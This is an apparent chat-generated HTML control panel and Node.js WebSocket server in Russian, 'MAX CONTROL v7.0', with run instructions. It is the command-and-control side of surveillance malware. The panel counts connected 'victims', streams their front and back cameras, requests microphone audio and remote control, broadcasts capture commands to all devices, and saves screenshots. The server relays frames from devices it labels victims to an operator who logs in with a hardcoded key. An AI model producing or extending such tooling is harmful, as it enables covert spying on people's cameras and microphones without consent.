<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MAX CONTROL v7.0</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }

        body {
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
        }

        .header {
            border: 2px solid #00ff00;
            padding: 20px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            background: #111;
        }

        .header-title {
            font-size: 28px;
            font-weight: bold;
        }

        .victim-count {
            font-size: 42px;
            font-weight: bold;
            text-align: right;
        }

        .connection-status {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 6px;
            margin-right: 5px;
        }

        .status-connected {
            background: #00ff00;
            box-shadow: 0 0 10px #00ff00;
        }

        .status-disconnected {
            background: #ff0000;
            box-shadow: 0 0 10px #ff0000;
        }

        .control-panel {
            border: 2px solid #00ff00;
            padding: 15px;
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            background: #111;
        }

        .control-btn {
            background: transparent;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
        }

        .control-btn:hover {
            background: #00ff00;
            color: #000;
        }

        .control-btn.danger {
            border-color: #ff0000;
            color: #ff0000;
        }

        .control-btn.danger:hover {
            background: #ff0000;
            color: #000;
        }

        .victims-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }

        .victim-card {
            border: 2px solid #00ff00;
            padding: 15px;
            background: #111;
        }

        .victim-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #00ff00;
        }

        .victim-id {
            font-weight: bold;
            color: #00ff00;
        }

        .status-badge {
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 12px;
        }

        .status-badge.active {
            background: #00ff00;
            color: #000;
        }

        .video-container {
            width: 100%;
            height: 200px;
            background: #000;
            margin-bottom: 10px;
            border: 1px solid #00ff00;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333;
        }

        .video-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .victim-footer {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }

        .victim-btn {
            flex: 1;
            background: transparent;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 5px;
            cursor: pointer;
            font-size: 11px;
            min-width: 60px;
        }

        .victim-btn:hover {
            background: #00ff00;
            color: #000;
        }

        .log-panel {
            border: 2px solid #00ff00;
            padding: 15px;
            background: #111;
        }

        .log-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #00ff00;
        }

        .log-container {
            height: 150px;
            overflow-y: auto;
            font-size: 12px;
        }

        .log-entry {
            padding: 3px 0;
            border-bottom: 1px solid #333;
        }

        .log-time {
            color: #666;
            margin-right: 10px;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
        }

        .modal.active {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: #111;
            border: 2px solid #00ff00;
            padding: 20px;
            max-width: 90%;
            max-height: 90%;
        }

        .modal-image {
            max-width: 100%;
            max-height: 80vh;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <div>
            <div class="header-title">MAX CONTROL v7.0</div>
            <div style="margin-top: 5px;">
                <span class="connection-status" id="connectionStatus"></span>
                <span id="connectionText">Отключено</span>
            </div>
        </div>
        <div>
            <div class="victim-count" id="victimCount">0</div>
            <div>УСТРОЙСТВ ONLINE</div>
        </div>
    </div>

    <!-- Control Panel -->
    <div class="control-panel">
        <button class="control-btn" onclick="connectToServer()" id="connectBtn">ПОДКЛЮЧИТЬСЯ</button>
        <button class="control-btn danger" onclick="disconnectFromServer()" id="disconnectBtn" style="display:none">ОТКЛЮЧИТЬСЯ</button>
        <button class="control-btn" onclick="clearAllVictims()">ОЧИСТИТЬ ВСЕ</button>
        <button class="control-btn" onclick="broadcastAudio()">АУДИО ВСЕМ</button>
        <button class="control-btn" onclick="broadcastVideo('front')">ФРОНТАЛЬНАЯ ВСЕМ</button>
        <button class="control-btn" onclick="broadcastVideo('back')">ОСНОВНАЯ ВСЕМ</button>
        <button class="control-btn" onclick="showSettings()">НАСТРОЙКИ</button>
    </div>

    <!-- Victims Grid -->
    <div class="victims-grid" id="victimsGrid"></div>

    <!-- Log Panel -->
    <div class="log-panel">
        <div class="log-header">
            <div>SYSTEM LOG</div>
            <button class="control-btn" style="padding:5px 10px" onclick="clearLog()">ОЧИСТИТЬ</button>
        </div>
        <div class="log-container" id="logContainer">
            <div class="log-entry">
                <span class="log-time">[12:00:00]</span> MAX Control v7.0 запущена
            </div>
        </div>
    </div>

    <!-- Modal -->
    <div class="modal" id="viewModal">
        <div class="modal-content">
            <img class="modal-image" id="modalImage" src="">
            <button class="control-btn" style="margin-top:10px; width:100%" onclick="closeModal()">ЗАКРЫТЬ</button>
        </div>
    </div>

    <script>
        // ========== КОНФИГУРАЦИЯ ==========
        let ws = null;
        let devices = new Map();
        let isConnected = false;
        
        const SERVER_URL = 'ws://localhost:8080/max-control';
        const ADMIN_KEY = 'admin123';

        // DOM элементы
        const victimsGrid = document.getElementById('victimsGrid');
        const logContainer = document.getElementById('logContainer');
        const victimCountSpan = document.getElementById('victimCount');
        const connectionStatus = document.getElementById('connectionStatus');
        const connectionText = document.getElementById('connectionText');
        const connectBtn = document.getElementById('connectBtn');
        const disconnectBtn = document.getElementById('disconnectBtn');

        // ========== ПОДКЛЮЧЕНИЕ ==========
        function connectToServer() {
            try {
                addLog('🔌 Подключение к серверу...');
                
                ws = new WebSocket(SERVER_URL);
                
                ws.onopen = function() {
                    isConnected = true;
                    connectionStatus.className = 'connection-status status-connected';
                    connectionText.innerText = 'Подключено';
                    connectBtn.style.display = 'none';
                    disconnectBtn.style.display = 'block';
                    
                    addLog('✅ Подключено к серверу');
                    
                    ws.send(JSON.stringify({
                        type: 'admin_connect',
                        key: ADMIN_KEY
                    }));
                };
                
                ws.onclose = function() {
                    isConnected = false;
                    connectionStatus.className = 'connection-status status-disconnected';
                    connectionText.innerText = 'Отключено';
                    connectBtn.style.display = 'block';
                    disconnectBtn.style.display = 'none';
                    
                    addLog('❌ Отключено от сервера');
                };
                
                ws.onmessage = function(event) {
                    try {
                        const data = JSON.parse(event.data);
                        handleServerMessage(data);
                    } catch(e) {
                        addLog('⚠️ Ошибка: ' + e.message);
                    }
                };
                
            } catch(e) {
                addLog('⚠️ Ошибка подключения: ' + e.message);
            }
        }

        function disconnectFromServer() {
            if (ws) {
                ws.close();
                ws = null;
            }
        }

        // ========== ОБРАБОТКА СООБЩЕНИЙ ==========
        function handleServerMessage(data) {
            switch(data.type) {
                case 'devices_list':
                    if (data.devices) {
                        data.devices.forEach(device => addDevice(device.deviceId || device));
                        addLog(`📋 Получен список: ${data.devices.length} устройств`);
                    }
                    break;
                    
                case 'new_device':
                    addDevice(data.deviceId);
                    addLog(`🆕 Новое устройство: ${data.deviceId.substring(0,8)}...`);
                    break;
                    
                case 'frame':
                    updateFrame(data.deviceId, data.frame);
                    break;
                    
                case 'device_left':
                    removeDevice(data.deviceId);
                    addLog(`👋 Устройство отключилось: ${data.deviceId.substring(0,8)}...`);
                    break;
                    
                case 'log':
                    addLog(`📝 ${data.message}`);
                    break;
            }
        }

        // ========== УПРАВЛЕНИЕ УСТРОЙСТВАМИ ==========
        function addDevice(deviceId) {
            if (devices.has(deviceId)) return;
            
            const card = document.createElement('div');
            card.className = 'victim-card';
            card.id = `device_${deviceId}`;
            
            card.innerHTML = `
                <div class="victim-header">
                    <span class="victim-id">${deviceId.substring(0,8)}</span>
                    <span class="status-badge active">ONLINE</span>
                </div>
                <div class="video-container" onclick="openModal('${deviceId}')">
                    <img id="img_${deviceId}" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='200' viewBox='0 0 300 200'%3E%3Crect width='300' height='200' fill='%23111'/%3E%3Ctext x='150' y='100' fill='%23333' text-anchor='middle' font-family='monospace'%3ENO SIGNAL%3C/text%3E%3C/svg%3E">
                </div>
                <div class="victim-footer">
                    <button class="victim-btn" onclick="event.stopPropagation(); requestCamera('${deviceId}', 'front')">ФРОНТ</button>
                    <button class="victim-btn" onclick="event.stopPropagation(); requestCamera('${deviceId}', 'back')">ОСН</button>
                    <button class="victim-btn" onclick="event.stopPropagation(); requestAudio('${deviceId}')">АУДИО</button>
                    <button class="victim-btn" onclick="event.stopPropagation(); requestRemote('${deviceId}')">УПР</button>
                    <button class="victim-btn" onclick="event.stopPropagation(); takeScreenshot('${deviceId}')">СКРИН</button>
                </div>
            `;
            
            victimsGrid.appendChild(card);
            devices.set(deviceId, card);
            updateVictimCount();
        }

        function updateFrame(deviceId, frameData) {
            const img = document.getElementById(`img_${deviceId}`);
            if (img) {
                img.src = frameData;
            }
        }

        function removeDevice(deviceId) {
            const card = document.getElementById(`device_${deviceId}`);
            if (card) {
                card.remove();
                devices.delete(deviceId);
                updateVictimCount();
            }
        }

        function clearAllVictims() {
            victimsGrid.innerHTML = '';
            devices.clear();
            updateVictimCount();
            addLog('🗑️ Все устройства удалены');
        }

        function updateVictimCount() {
            victimCountSpan.innerText = devices.size;
        }

        // ========== КОМАНДЫ ==========
        function requestCamera(deviceId, type) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                    type: 'command',
                    deviceId: deviceId,
                    command: 'camera',
                    camera: type
                }));
                addLog(`📷 Запрос ${type} камеры для ${deviceId.substring(0,8)}...`);
            }
        }

        function requestAudio(deviceId) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                    type: 'command',
                    deviceId: deviceId,
                    command: 'audio'
                }));
                addLog(`🎤 Запрос аудио для ${deviceId.substring(0,8)}...`);
            }
        }

        function requestRemote(deviceId) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                    type: 'command',
                    deviceId: deviceId,
                    command: 'remote'
                }));
                addLog(`📲 Запрос управления для ${deviceId.substring(0,8)}...`);
            }
        }

        function takeScreenshot(deviceId) {
            const img = document.getElementById(`img_${deviceId}`);
            if (img && img.src) {
                const link = document.createElement('a');
                link.download = `max_${deviceId}_${Date.now()}.jpg`;
                link.href = img.src;
                link.click();
                addLog(`📸 Скриншот ${deviceId.substring(0,8)}... сохранен`);
            }
        }

        // ========== МАССОВЫЕ КОМАНДЫ ==========
        function broadcastAudio() {
            devices.forEach((_, deviceId) => {
                requestAudio(deviceId);
            });
            addLog(`🎤 Аудио запрос всем (${devices.size})`);
        }

        function broadcastVideo(type) {
            devices.forEach((_, deviceId) => {
                requestCamera(deviceId, type);
            });
            addLog(`📷 ${type} камера всем (${devices.size})`);
        }

        // ========== МОДАЛЬНОЕ ОКНО ==========
        function openModal(deviceId) {
            const img = document.getElementById(`img_${deviceId}`);
            if (img && img.src) {
                document.getElementById('modalImage').src = img.src;
                document.getElementById('viewModal').classList.add('active');
            }
        }

        function closeModal() {
            document.getElementById('viewModal').classList.remove('active');
        }

        // ========== ЛОГИ ==========
        function addLog(message) {
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            
            const time = new Date().toLocaleTimeString();
            entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
            
            logContainer.appendChild(entry);
            logContainer.scrollTop = logContainer.scrollHeight;
            
            while (logContainer.children.length > 50) {
                logContainer.removeChild(logContainer.children[0]);
            }
        }

        function clearLog() {
            logContainer.innerHTML = '';
            addLog('🗑️ Лог очищен');
        }

        // ========== НАСТРОЙКИ ==========
        function showSettings() {
            alert(`MAX Control v7.0\nСервер: ${SERVER_URL}\nУстройств: ${devices.size}\nСтатус: ${isConnected ? 'Подключено' : 'Отключено'}`);
        }

        // ========== ИНИЦИАЛИЗАЦИЯ ==========
        window.addEventListener('load', function() {
            addLog('✨ MAX Control v7.0 готова');
        });

        // Горячие клавиши
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closeModal();
            }
        });
    </script>
</body>
</html>
```

Для работы нужно:

1. server.js (запусти на компьютере):

```javascript
const WebSocket = require('ws');
const http = require('http');

const server = http.createServer();
const wss = new WebSocket.Server({ server });

const devices = new Map();
const admins = new Set();

wss.on('connection', (ws, req) => {
    const isAdmin = req.url === '/max-control';
    const id = Math.random().toString(36).substring(7);
    
    if (!isAdmin) {
        // Жертва
        devices.set(id, { ws, status: 'active' });
        console.log('Device connected:', id);
        
        broadcastToAdmins({ type: 'new_device', deviceId: id });
        
        ws.on('message', (data) => {
            try {
                const msg = JSON.parse(data);
                broadcastToAdmins({ deviceId: id, ...msg });
            } catch(e) {}
        });
        
        ws.on('close', () => {
            devices.delete(id);
            broadcastToAdmins({ type: 'device_left', deviceId: id });
        });
        
    } else {
        // Админ
        let authenticated = false;
        
        ws.on('message', (data) => {
            try {
                const msg = JSON.parse(data);
                
                if (msg.type === 'admin_connect' && msg.key === 'admin123') {
                    authenticated = true;
                    admins.add(ws);
                    
                    const devicesList = Array.from(devices.keys());
                    ws.send(JSON.stringify({ type: 'devices_list', devices: devicesList }));
                }
            } catch(e) {}
        });
        
        ws.on('close', () => {
            if (authenticated) admins.delete(ws);
        });
    }
});

function broadcastToAdmins(data) {
    admins.forEach(admin => {
        if (admin.readyState === WebSocket.OPEN) {
            admin.send(JSON.stringify(data));
        }
    });
}

server.listen(8080, () => {
    console.log('MAX Server running on port 8080');
    console.log('Admin: ws://localhost:8080/max-control');
    console.log('Devices: ws://localhost:8080/max-access');
});
```

1
